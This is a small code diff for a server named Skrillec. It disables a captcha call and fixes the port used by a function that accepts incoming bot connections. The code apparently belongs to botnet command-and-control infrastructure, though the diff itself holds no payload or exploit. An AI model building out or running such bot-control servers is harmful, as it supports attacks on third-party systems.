@@ -73,7 +73,7 @@ pub fn (mut s Server) connection_handler(mut socket net.TcpConn) {
 	/*
 		Captcha shit here
 	*/
-    server.captcha(mut socket)
+    // server.captcha(mut socket)
 	//Add login here then log the user's username, IP, and detect if user is using the Skrillec CLIENT to connect
 	/*
 		Login shit here
@@ -155,7 +155,7 @@ pub fn (mut c Clients) get_username(mut socket net.TcpConn) string {
 *
 *****************************************************************************************************/
 pub fn start_skrillec_bot(mut svr server.Server) {
-	mut bot_svr := net.listen_tcp(.ip6, ":${s.port}") or { panic("[x] Error, Unable to bind server. Port is being used!") }
+	mut bot_svr := net.listen_tcp(.ip6, ":${svr.bot_port}") or { panic("[x] Error, Unable to bind server. Port is being used!") }
 	for {
 		mut bot_socket := bot_svr.accept() or { panic("[x] Error, Unable to accept the incoming connection!") }
 		bot_socket.set_read_timeout(time.infinite)
